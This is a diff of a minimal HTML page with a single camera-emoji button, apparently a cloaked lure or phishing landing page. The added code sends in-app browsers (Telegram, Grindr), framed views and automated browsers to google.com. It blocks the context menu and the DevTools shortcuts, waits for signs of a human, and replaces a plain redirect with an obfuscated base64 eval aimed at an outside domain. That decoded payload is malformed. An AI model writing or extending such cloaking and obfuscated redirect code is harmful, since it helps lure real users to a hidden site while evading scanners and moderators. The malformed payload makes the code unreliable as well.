@@ -4,6 +4,7 @@
   <meta charset="UTF-8" />
   <title>📷</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
   <style>
     html, body {
       margin: 0;
@@ -32,7 +33,7 @@
   <button class="btn" onclick="go()">📷</button>
 
   <script>
-    // Блокировка встроенных браузеров
+    // 🔐 Проверка на встроенные браузеры
     (function() {
       const ua = navigator.userAgent.toLowerCase();
       const isWebview =
@@ -47,25 +48,40 @@
         ua.includes("telegram") ||
         ua.includes("grindr");
 
-      if (isWebview || window.top !== window.self) {
+      if (isWebview) {
+        window.location.href = "https://google.com";
+        return;
+      }
+
+      if (window.top !== window.self) {
+        window.location.href = "https://google.com";
+        return;
+      }
+
+      if (navigator.webdriver) {
         window.location.href = "https://google.com";
         return;
       }
     })();
 
-    // Проверка взаимодействия
+    // 👤 Проверка взаимодействия
     let interacted = false;
     document.addEventListener("mousemove", () => interacted = true);
     document.addEventListener("touchstart", () => interacted = true);
     document.addEventListener("keypress", () => interacted = true);
 
+    // 🚫 DevTools и контекстное меню
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.onkeydown = e => {
+      if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && e.keyCode === 73)) return false;
+    };
+
     function go() {
       if (!interacted) return;
 
       setTimeout(() => {
-        const encoded = "aHR0cHM6Ly9nYXlyb24ubGlmZS9yZWhiaXhlZQ=="; // base64 от https://gayron.life/rehbixee
-        const finalURL = atob(encoded);
-        window.location.href = finalURL;
+        const j = "ZXZhbChhdG9iKCJodHRwczovL2dheXJvbi5saWZlL3N1cGVyc2VjcmV0Iikp";
+        eval(atob(j));
       }, 2000);
     }
   </script>
